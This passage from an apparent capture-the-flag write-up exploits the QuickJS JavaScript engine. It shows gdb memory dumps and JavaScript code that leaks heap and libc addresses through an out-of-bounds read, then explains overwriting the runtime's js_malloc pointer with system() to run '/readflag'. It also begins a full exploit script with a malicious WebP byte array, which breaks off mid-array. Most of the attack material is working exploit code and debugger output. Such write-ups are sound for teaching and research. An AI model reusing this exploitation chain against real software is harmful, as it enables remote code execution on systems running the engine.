</span></span><span class="line"><span class="cl">0x555555e387a0:	0x0000000037373737	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e387b0:	0x0000000000000000	0x0000000000000051
</span></span><span class="line"><span class="cl">0x555555e387c0:	0x001f0d0000000002	0x0000555555e3e888
</span></span><span class="line"><span class="cl">0x555555e387d0:	0x0000555555e38878	0x000055555581ef30
</span></span><span class="line"><span class="cl">0x555555e387e0:	0x0000555555e38810	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e387f0:	0x0000555555e38840	0x0000555555e387a0
</span></span><span class="line"><span class="cl">0x555555e38800:	0x0000000037373737	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e38810:	0x00007ffff7dfed00	0x00007ffff7dfed00
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>data</code> begins at <code>0x0000555555e387a0</code>. Notably, <code>data[7]</code> reveals a <code>heap</code> address, and <code>data[14]</code> discloses a <code>libc</code> address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Based on observation in gdb:
</span></span></span><span class="line"><span class="cl"><span class="c1">// - offset 7 will give us heap leak (heap_base+0xf30)
</span></span></span><span class="line"><span class="cl"><span class="c1">// - offset 14 will give us libc leak
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">leaked_heap</span> <span class="o">=</span> <span class="nx">z</span><span class="p">[</span><span class="mi">82</span><span class="p">][</span><span class="mi">7</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">leaked_libc</span> <span class="o">=</span> <span class="nx">z</span><span class="p">[</span><span class="mi">82</span><span class="p">][</span><span class="mi">14</span><span class="p">];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Having successfully leaked values with the OOB Read, we&rsquo;re now positioned to achieve Remote Code Execution (RCE) utilizing the OOB Write.</p>
<h4 id="gaining-rce">Gaining RCE</h4>
<p>To achieve Remote Code Execution (RCE), I noticed that a QuickJS object called <code>JSRuntime</code> stores a list of function pointers named <code>JSMallocFunctions</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">JSRuntime</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">JSMallocFunctions</span> <span class="n">mf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">JSMallocState</span> <span class="n">malloc_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">JSMallocFunctions</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">js_malloc</span><span class="p">)(</span><span class="n">JSMallocState</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">js_free</span><span class="p">)(</span><span class="n">JSMallocState</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">js_realloc</span><span class="p">)(</span><span class="n">JSMallocState</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="p">(</span><span class="o">*</span><span class="n">js_malloc_usable_size</span><span class="p">)(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">JSMallocFunctions</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This object is located in the heap, where:</p>
<ul>
<li><code>JSRuntime-&gt;mf</code> is at <code>heap_base+0x2a0</code>.</li>
<li><code>JSRuntime-&gt;malloc_state</code> is at <code>heap_base+0x2c0</code>.</li>
</ul>
<p>Examining the function used to create a new <code>ArrayBuffer</code> (<code>js_array_buffer_constructor3</code>), we see it eventually calls <code>rt-&gt;mf.js_malloc(&amp;rt-&gt;malloc_state, size);</code>. If we can redirect <code>rt-&gt;mf.js_malloc</code> to the <code>system</code> function and set <code>rt-&gt;malloc_state</code> to <code>/readflag</code>, we can trigger RCE.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">JSValue</span> <span class="nf">js_array_buffer_constructor3</span><span class="p">(</span><span class="n">JSContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                            <span class="n">JSValueConst</span> <span class="n">new_target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                            <span class="kt">uint64_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">JSClassID</span> <span class="n">class_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                            <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                            <span class="n">JSFreeArrayBufferDataFunc</span> <span class="o">*</span><span class="n">free_func</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                            <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">BOOL</span> <span class="n">alloc_flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="n">abuf</span> <span class="o">=</span> <span class="nf">js_malloc</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">abuf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">js_malloc</span><span class="p">(</span><span class="n">JSContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="n">ptr</span> <span class="o">=</span> <span class="nf">js_malloc_rt</span><span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">rt</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">js_malloc_rt</span><span class="p">(</span><span class="n">JSRuntime</span> <span class="o">*</span><span class="n">rt</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rt</span><span class="o">-&gt;</span><span class="n">mf</span><span class="p">.</span><span class="nf">js_malloc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rt</span><span class="o">-&gt;</span><span class="n">malloc_state</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our goal is to perform an OOB write at these locations. We can use the write primitives of <code>Float64Array</code> for this purpose.</p>
<p>Remember that <code>Float64Array</code> maintains a pointer to its <code>data</code>. Observing the memory layout of our corrupted <code>Float64Array</code> (<code>z[82]</code> and <code>z[83]</code>), we see:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; x/100gx *(uint64_t*)$r8-0x30
</span></span><span class="line"><span class="cl">0x555555e38790:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x555555e387a0:	0x0000000037373737	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e387b0:	0x0000000000000000	0x0000000000000051
</span></span><span class="line"><span class="cl">0x555555e387c0:	0x001f0d0000000002	0x0000555555e3e888
</span></span><span class="line"><span class="cl">0x555555e387d0:	0x0000555555e38878	0x000055555581ef30
</span></span><span class="line"><span class="cl">0x555555e387e0:	0x0000555555e38810	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e387f0:	0x0000555555e38840	0x0000555555e387a0
</span></span><span class="line"><span class="cl">0x555555e38800:	0x0000000037373737	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e38810:	0x00007ffff7dfed00	0x00007ffff7dfed00
</span></span></code></pre></td></tr></table>
</div>
</div><p>By overwriting <code>data[11]</code> with our target address, any assignment to <code>data[0]</code> will modify the content at our target address.</p>
<p>Using this technique, we can manipulate our corrupted arrays to overwrite <code>rt-&gt;malloc_state</code> and <code>rt-&gt;mf.js_malloc</code>. Subsequent allocation of a new <code>ArrayBuffer</code> will then execute <code>system(&quot;/readflag&quot;)</code>.</p>
<p>Here&rsquo;s the complete exploit code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Helper taken from https://changochen.github.io/2019-04-29-starctf-2019.html
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">f64</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u32</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">f64</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">u32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">lo</span><span class="p">,</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">hi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">lo</span><span class="p">,</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">lo</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">hi</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;00000000&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">hi</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">lo</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;00000000&#39;</span><span class="o">+</span><span class="nx">hi</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span><span class="p">(</span><span class="s1">&#39;00000000&#39;</span><span class="o">+</span><span class="nx">lo</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Malicious webp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">webp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">82</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span 